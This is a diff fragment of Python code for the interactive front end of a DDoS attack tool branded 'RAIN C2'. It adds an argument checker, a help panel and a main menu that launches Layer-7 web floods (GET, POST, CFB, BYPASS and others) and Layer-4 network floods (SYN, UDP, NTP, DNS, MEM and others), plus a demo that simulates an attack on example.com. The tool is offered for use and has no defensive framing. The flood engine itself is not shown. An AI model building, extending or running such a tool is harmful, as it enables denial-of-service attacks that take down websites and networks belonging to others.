+            int(parts[3])                  # threads
+            int(parts[5])                  # rpc
+            if int(parts[6]) < 1:          # duration
+                raise ValueError("DURATION must be at least 1")
+        else:
+            int(parts[2])                  # threads
+            if int(parts[3]) < 1:          # duration
+                raise ValueError("DURATION must be at least 1")
+    except (ValueError, IndexError) as exc:
+        print(paint(f"[!] Argument error : {exc}  (recheck the numeric positions)", C.R))
+        return
+    _run_attack(script, parts)
+
+
+def show_all_methods(l7, l4):
+    open_screen(METHODS_ART, "ALL ATTACK METHODS",
+                "LAYER-7 (WEB) + LAYER-4 (NETWORK) full list")
+    show_method_panel("LAYER-7 (WEB) METHODS", sorted(l7))
+    show_method_panel("LAYER-4 (NETWORK) METHODS", sorted(l4))
+    pour([
+        ["  TOOLS methods : INFO  DNS  PING  CHECK  DSTAT  TSSRV  CFIP",
+         "  special cmds  : TOOLS(console)  HELP  STOP"],
+    ], para_gap=0.05, char_delay=0.04)
+
+
+def show_help():
+    """Show the available commands in a double-line box when /help is entered on the main menu."""
+    print("")
+    draw_dbl_panel([
+        paint("[1]   LAYER-7     START WEB ATTACK", C.W),
+        paint("[2]   LAYER-4     START NETWORK ATTACK", C.W),
+        paint("[3]   TOOLS       ENTER TOOLS CONSOLE", C.W),
+        paint("[4]   EXPERT      DIRECT COMMAND EXECUTION", C.W),
+        paint("[0]   EXIT        QUIT", C.W),
+        "",
+        paint("TOOLS console cmds : INFO  TSSRV  CFIP  DNS  PING  CHECK  DSTAT", C.CY),
+        paint("TOOLS special cmds : HELP  CLEAR  BACK  EXIT", C.CY),
+        "",
+        paint("/help           show this command help again", C.Y, bold=True),
+    ], title="RAIN C2 COMMANDS", width=64)
+    print("")
+
+
+def interactive_main(l7_methods, l4_methods, script):
+    """Main screen loop when start.py is run without arguments."""
+    init()
+    if not l7_methods:
+        l7_methods = ["GET", "POST", "OVH", "CFB", "DYN", "SLOW", "RHEX", "STOMP",
+                      "STRESS", "BYPASS", "PPS", "BOMB", "DOWNLOADER"]
+    if not l4_methods:
+        l4_methods = ["TCP", "UDP", "SYN", "ICMP", "NTP", "DNS", "MEM", "RDP"]
+
+    l7 = set(l7_methods)
+    l4 = set(l4_methods)
+
+    while True:
+        # show_main_screen draws everything (RAIN art + 2 boxes + labels)
+        show_main_screen()
+
+        try:
+            choice = input(paint("  ℛ𝒶𝒾𝓃 ☾⁺₊ >> ", C.M, bold=True)).strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print("")
+            break
+
+        if choice in {"0", "exit", "quit", "q", "e", "x"}:
+            typewrite(paint("[!] SHUTTING DOWN ...", C.Y), delay=0.04)
+            break
+
+        try:
+            if choice == "1":
+                wizard_layer7(script, sorted(l7))
+            elif choice == "2":
+                wizard_layer4(script, sorted(l4))
+            elif choice == "3":
+                open_screen(TOOLS_ART, "TOOLS  tools console",
+                            "INFO / DNS / PING / CHECK / DSTAT / TSSRV / CFIP")
+                _run_attack(script, ["TOOLS"])
+            elif choice == "4":
+                expert_cmd(script, l7, l4)
+            elif choice in {"help", "h", "?", "/help", "/h", "/?",
+                            "/commands", "/cmd"}:
+                show_help()
+            else:
+                print(paint(f"  [!] Unknown command : {choice}   (enter 0-4)", C.R))
+        except Exception as exc:
+            print(paint(f"  [!] Unexpected error : {exc}", C.R, bold=True))
+
+        typewrite(paint("\n  [i] Press ENTER to return to the main screen ...", C.DIM), delay=0.04)
+        try:
+            input("")
+        except (EOFError, KeyboardInterrupt):
+            print("")
+            break
+
+
+# ---------------------------------------------------------------------------
+# Standalone run: effect preview demo
+# ---------------------------------------------------------------------------
+if __name__ == "__main__":
+    init()
+    show_main_screen()
+    print("")  # spacing below the tagline
+    pour([
+        [paint("[DEMO] RAIN art engine preview", C.W, bold=True)],
+        [paint("  This screen is the main menu shown when start.py is run without arguments.", C.CY),
+         paint("  Below is an example of the 'paragraph-by-paragraph' effect when an attack starts.", C.CY)],
+    ], para_gap=0.18, char_delay=0.04)
+    show_attack_start(
+        method="GET", target="example.com", address="93.184.216.34",
+        port=443, threads=300, duration=60, is_layer7=True, proxy_count=1024)
+    import random as _r
+    try:
+        for i in range(5):
+            render_status(i, 60, "GET", "example.com",
+                          pps=_r.randint(5000, 90000), bps=_r.randint(100000, 50000000),
+                          threads=300, elapsed=i * 12 + 1, duration=60)
+            time.sleep(0.25)
+    except KeyboardInterrupt:
+        pass
+    print("")
+    show_attack_end(total_requests=1234567, total_bytes=987654321)
